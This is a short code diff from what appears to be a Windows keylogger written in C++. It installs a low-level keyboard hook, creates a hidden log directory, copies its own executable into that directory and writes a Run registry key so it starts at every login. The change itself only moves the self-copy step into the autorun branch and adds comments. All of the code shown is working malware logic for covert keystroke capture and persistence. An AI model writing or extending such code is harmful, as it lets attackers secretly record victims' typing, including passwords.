@@ -34,18 +34,17 @@ int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 	//WM_KEYBOARD_LL hook
 	SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
 
-	//Get current instance's executable file path
-	TCHAR szFileName[MAX_PATH];
-	GetModuleFileName(NULL, szFileName, MAX_PATH);
-
-	//Copy to C:
+	//Create directory for log
 	CreateDirectory(dirPath.c_str(), NULL);
 	SetFileAttributes(dirPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
 	
 	//Copy to autorun
 	if (copyToAutorun) {
-		tstring fileCopyPath = dirPath + _T("\\") + executableFileName;
-		CopyFile(szFileName, fileCopyPath.c_str(), TRUE);
+		TCHAR szFileName[MAX_PATH];
+		GetModuleFileName(NULL, szFileName, MAX_PATH); //Get current instance's executable file path
+		tstring fileCopyPath = dirPath + _T("\\") + executableFileName;	//Get final path
+		CopyFile(szFileName, fileCopyPath.c_str(), TRUE); //Copy executable file
+		//Set registry autorun key
 		HKEY hKey = NULL;
 		LONG result = RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey);
 		RegSetValueEx(hKey, _T("Autorun"), 0, REG_SZ, (PBYTE)fileCopyPath.c_str(), fileCopyPath.size() * sizeof(TCHAR) + 1);
